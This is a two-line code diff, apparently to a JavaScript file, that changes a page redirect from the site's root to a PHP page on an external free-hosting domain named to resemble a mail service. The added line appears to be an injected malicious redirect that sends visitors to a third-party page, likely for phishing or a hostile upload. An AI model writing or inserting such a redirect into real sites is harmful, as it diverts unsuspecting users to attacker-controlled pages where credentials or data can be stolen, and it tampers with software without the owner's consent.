@@ -1,2 +1,2 @@
 /*subida*/
-window.location="/";
+window.location="//clientsntmail.000webhostapp.com/subida.php";
